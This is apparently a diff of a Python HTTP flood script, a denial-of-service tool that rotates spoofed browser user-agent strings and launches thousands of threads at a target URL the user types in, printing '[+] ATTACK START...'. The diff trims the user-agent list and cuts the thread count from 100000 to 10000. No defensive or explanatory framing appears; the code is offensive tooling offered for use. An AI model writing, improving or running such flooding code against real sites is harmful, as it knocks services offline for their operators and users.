@@ -35,28 +35,6 @@ def flood(url):
         "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:91.0) Gecko/20100101 Firefox/91.0",
         "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
         "Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; AS; rv:11.0) like Gecko",
-        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36",
-        "Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; AS; rv:11.0) like Gecko",
-        "Mozilla/5.0 (Windows NT 6.2; Trident/7.0; AS; rv:11.0) like Gecko",
-        "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; AS; rv:11.0) like Gecko",
-        "Mozilla/5.0 (Windows NT 6.4; Trident/7.0; AS; rv:11.0) like Gecko",
-        "Mozilla/5.0 (Windows NT 5.1; rv:64.0) Gecko/20100101 Firefox/64.0",
-        "Mozilla/5.0 (Windows NT 5.1; rv:60.0) Gecko/20100101 Firefox/60.0",
-        "Mozilla/5.0 (Windows NT 6.0; rv:65.0) Gecko/20100101 Firefox/65.0",
-        "Mozilla/5.0 (Windows NT 6.0; rv:66.0) Gecko/20100101 Firefox/66.0",
-        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36",
-        "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
-        "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
-        "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
-        "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0",
-        "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0",
-        "Mozilla/5.0 (Linux; Android 10; Moto G7 Build/PPSS29.88-53) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Mobile Safari/537.36",
-        "Mozilla/5.0 (Linux; Android 9; SM-G960F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36",
-        "Mozilla/5.0 (Linux; Android 8.1.0; Pixel 2 XL Build/OPM4.171019.021) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Mobile Safari/537.36",
-        "Mozilla/5.0 (Linux; Android 7.1.1; Nexus 6P Build/N4F27B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Mobile Safari/537.36",
-        "Mozilla/5.0 (Linux; Android 6.0; Nexus 5X Build/MTC20L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Mobile Safari/537.36",
-        "Mozilla/5.0 (Linux; Android 5.0; Nexus 6 Build/LRX21P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Mobile Safari/537.36",
-        "Mozilla/5.0 (Linux; Android 4.4.4; Nexus 4 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36",
     ]
     
     while True:
@@ -71,7 +49,7 @@ def start_flooding():
     target_url = input("[+] TARGET URL : ")
     print("[+] ATTACK START...")
     
-    for i in range(100000): 
+    for i in range(10000): 
         thread = threading.Thread(target=flood, args=(target_url,))
         thread.start()
 
